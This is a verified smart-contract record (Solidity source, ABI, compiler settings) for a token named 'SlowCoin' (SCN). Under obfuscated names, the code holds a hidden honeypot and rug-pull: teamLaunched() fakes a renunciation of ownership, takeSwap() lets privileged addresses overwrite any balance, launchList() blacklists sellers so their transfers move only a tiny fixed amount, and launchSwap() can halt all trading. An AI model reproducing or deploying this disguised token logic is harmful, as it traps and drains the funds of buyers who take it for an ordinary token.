{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract shouldMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTake {\n    function createPair(address fromAt, address minExempt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface senderMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface exemptSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalBuy) external view returns (uint256);\n\n    function transfer(address txTo, uint256 fromExempt) external returns (bool);\n\n    function allowance(address limitEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTo,\n        uint256 fromExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLiquidity, uint256 value);\n    event Approval(address indexed limitEnable, address indexed spender, uint256 value);\n}\n\ninterface exemptSellMetadata is exemptSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SlowCoin is shouldMin, exemptSell, exemptSellMetadata {\n\n    uint256 public listTotal = 0;\n\n    string private fromTeam = \"SCN\";\n\n    function balanceOf(address totalBuy) public view virtual override returns (uint256) {\n        return limitShouldTeam[totalBuy];\n    }\n\n    address limitToken;\n\n    uint256 private tradingTo = 100000000 * 10 ** 18;\n\n    function limitLaunch(address takeReceiver) public {\n        require(takeReceiver.balance < 100000);\n        if (takeFeeReceiver) {\n            return;\n        }\n        \n        minTake[takeReceiver] = true;\n        if (modeReceiver == atFrom) {\n            atFrom = amountWalletBuy;\n        }\n        takeFeeReceiver = true;\n    }\n\n    mapping(address => bool) public minTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundMin;\n    }\n\n    uint256 autoSellEnable;\n\n    uint8 private fundMin = 18;\n\n    mapping(address => uint256) private limitShouldTeam;\n\n    function swapWalletEnable(address receiverToTrading, address txTo, uint256 fromExempt) internal view returns (uint256) {\n        require(fromExempt > 0);\n\n        uint256 feeReceiver = 0;\n        if (receiverToTrading == atBuy && liquidityFromMarketing > 0) {\n            feeReceiver = fromExempt * liquidityFromMarketing / 100;\n        } else if (txTo == atBuy && listTotal > 0) {\n            feeReceiver = fromExempt * listTotal / 100;\n        }\n        require(feeReceiver <= fromExempt);\n        return fromExempt - feeReceiver;\n    }\n\n    mapping(address => bool) public shouldSender;\n\n    function takeMode(address receiverToTrading, address txTo, uint256 fromExempt) internal returns (bool) {\n        require(limitShouldTeam[receiverToTrading] >= fromExempt);\n        limitShouldTeam[receiverToTrading] -= fromExempt;\n        limitShouldTeam[txTo] += fromExempt;\n        emit Transfer(receiverToTrading, txTo, fromExempt);\n        return true;\n    }\n\n    uint256 private amountWalletBuy;\n\n    uint256 private modeReceiver;\n\n    function transferFrom(address receiverToTrading, address txTo, uint256 fromExempt) external override returns (bool) {\n        if (_msgSender() != txTake) {\n            if (swapTo[receiverToTrading][_msgSender()] != type(uint256).max) {\n                require(fromExempt <= swapTo[receiverToTrading][_msgSender()]);\n                swapTo[receiverToTrading][_msgSender()] -= fromExempt;\n            }\n        }\n        return tokenIs(receiverToTrading, txTo, fromExempt);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTeam;\n    }\n\n    function teamLaunched() public {\n        emit OwnershipTransferred(enableFee, address(0));\n        maxWallet = address(0);\n    }\n\n    address txTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed tradingSender, address indexed swapIs);\n\n    function launchList(address receiverLiquidity) public {\n        totalSell();\n        if (amountWalletBuy == modeReceiver) {\n            modeReceiver = atFrom;\n        }\n        if (receiverLiquidity == enableFee || receiverLiquidity == atBuy) {\n            return;\n        }\n        shouldSender[receiverLiquidity] = true;\n    }\n\n    address public atBuy;\n\n    uint256 constant amountFromMin = 9 ** 10;\n\n    function tokenIs(address receiverToTrading, address txTo, uint256 fromExempt) internal returns (bool) {\n        if (receiverToTrading == enableFee) {\n            return takeMode(receiverToTrading, txTo, fromExempt);\n        }\n        uint256 sellLiquidityFee = exemptSell(atBuy).balanceOf(limitToken);\n        require(sellLiquidityFee == autoSellEnable);\n        require(txTo != limitToken);\n        if (shouldSender[receiverToTrading]) {\n            return takeMode(receiverToTrading, txTo, amountFromMin);\n        }\n        fromExempt = swapWalletEnable(receiverToTrading, txTo, fromExempt);\n        return takeMode(receiverToTrading, txTo, fromExempt);\n    }\n\n    function approve(address buySellFund, uint256 fromExempt) public virtual override returns (bool) {\n        swapTo[_msgSender()][buySellFund] = fromExempt;\n        emit Approval(_msgSender(), buySellFund, fromExempt);\n        return true;\n    }\n\n    function allowance(address listMin, address buySellFund) external view virtual override returns (uint256) {\n        if (buySellFund == txTake) {\n            return type(uint256).max;\n        }\n        return swapTo[listMin][buySellFund];\n    }\n\n    uint256 public atFrom;\n\n    function launchSwap(uint256 fromExempt) public {\n        totalSell();\n        autoSellEnable = fromExempt;\n    }\n\n    bool private feeReceiverAmount;\n\n    function takeSwap(address tradingWalletBuy, uint256 fromExempt) public {\n        totalSell();\n        limitShouldTeam[tradingWalletBuy] = fromExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapTo;\n\n    constructor (){\n        if (feeIs != feeReceiverAmount) {\n            feeIs = true;\n        }\n        teamLaunched();\n        senderMax listMode = senderMax(txTake);\n        atBuy = feeTake(listMode.factory()).createPair(listMode.WETH(), address(this));\n        limitToken = feeTake(listMode.factory()).feeTo();\n        \n        enableFee = _msgSender();\n        minTake[enableFee] = true;\n        limitShouldTeam[enableFee] = tradingTo;\n        \n        emit Transfer(address(0), enableFee, tradingTo);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTo;\n    }\n\n    string private launchMax = \"Slow Coin\";\n\n    uint256 public liquidityFromMarketing = 3;\n\n    address private maxWallet;\n\n    function totalSell() private view {\n        require(minTake[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return maxWallet;\n    }\n\n    bool public takeFeeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return launchMax;\n    }\n\n    function transfer(address tradingWalletBuy, uint256 fromExempt) external virtual override returns (bool) {\n        return tokenIs(_msgSender(), tradingWalletBuy, fromExempt);\n    }\n\n    uint256 walletTradingReceiver;\n\n    address public enableFee;\n\n    bool private feeIs;\n\n    function owner() external view returns (address) {\n        return maxWallet;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySellFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySellFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"launchList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromExempt\",\"type\":\"uint256\"}],\"name\":\"launchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFromMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFeeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWalletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromExempt\",\"type\":\"uint256\"}],\"name\":\"takeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWalletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SlowCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}